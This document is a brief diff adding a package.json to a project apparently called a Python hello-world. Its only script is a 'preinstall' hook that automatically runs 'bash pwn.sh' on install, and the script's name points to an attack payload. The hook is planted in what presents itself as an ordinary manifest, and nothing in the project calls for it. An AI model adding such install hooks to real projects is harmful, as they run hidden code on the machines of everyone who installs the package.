@@ -1,0 +1,7 @@
+{
+  "name": "balena-python-hello-world",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "bash pwn.sh"
+  }
+}
